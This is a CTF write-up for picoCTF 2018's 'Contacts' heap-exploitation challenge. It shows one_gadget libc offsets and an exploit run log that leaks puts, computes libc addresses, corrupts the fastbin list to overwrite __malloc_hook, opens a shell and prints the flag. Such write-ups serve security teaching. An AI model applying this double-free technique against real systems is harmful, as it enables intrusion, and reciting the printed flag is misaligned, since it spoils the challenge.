# Contacts - Points: 850 - (Solves: 51)

This [program][1] for storing your contacts is currently in beta.
Can you hijack control and get a shell?
Connect with nc 2018shell2.picoctf.com 40352.
[Source][2].
[libc.so.6][3]

[1]: https://2018shell2.picoctf.com/static/b04ed5d28d885e185d0f409a6b9b941f/contacts
[2]: https://2018shell2.picoctf.com/static/b04ed5d28d885e185d0f409a6b9b941f/contacts.c
[3]: https://2018shell2.picoctf.com/static/b04ed5d28d885e185d0f409a6b9b941f/libc.so.6

## Hints

- If only the author used calloc() instead...
- fastbin fastbin fastbin
- Make sure you are run/debug with the provided libc on the shell server

---

Check global state:

```sh
% ctags -x --c-kinds=vdts contacts.c
MAX_CONTACTS     macro         5 contacts.c       #define MAX_CONTACTS 16
contact          struct        7 contacts.c       struct contact {
contacts         variable     12 contacts.c       struct contact *contacts[MAX_CONTACTS];
num_contacts     variable     13 contacts.c       unsigned int num_contacts = 0;
```

```
% nc 2018shell2.picoctf.com 40352
Available commands:
        display - display the contacts
        create [name] - create a new contact
        delete [name] - delete an existing contact
        bio [name] - set the bio for an existing contact
        quit - exit the program

Enter your command:
```

```sh
% one_gadget libc.so.6
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

```sh
zzzz@pico-2018-shell-2:~/pico18/pwn/contacts$ py solve.py REMOTE
[*] '/home/zzzz/pico18/pwn/contacts/contacts'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RPATH:    './'
    FORTIFY:  Enabled
[*] '/home/zzzz/pico18/pwn/contacts/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 2018shell2.picoctf.com on port 40352: Done
[*] Now the free list has [A->bio]
[*] B gets address of [A->bio]
[*] Now the free list has [NULL]
[*] No initialization, now B->bio point to &puts@got
[*] Leaking puts address ...
[*] puts          : 0x7f188a596690
[*] libc          : 0x7f188a527000
[*] __malloc_hook : 0x7f188a8ebb10
[*] One gadget    : 0x7f188a618147
[*] Corrupting fastchunk list with fake chunk at: 0x7f188a8ebaed
[*] Switching to interactive mode
total 1908
drwxr-x---   2 hacksports contacts_4    4096 Sep 28 07:44 .
drwxr-x--x 576 root       root         53248 Sep 30 03:50 ..
-rwxr-sr-x   1 hacksports contacts_4   13776 Sep 28 15:11 contacts
-r--r-----   1 hacksports contacts_4      41 Sep 28 15:11 flag.txt
-rwxr-sr-x   1 hacksports contacts_4 1868984 Sep 28 15:08 libc.so.6
-rwxr-sr-x   1 hacksports contacts_4     115 Sep 28 15:11 xinet_startup.sh
$ cat flag.txt
picoCTF{4_5pr3e_0f_d0ubl3_fR33_be84fe98}
$
```
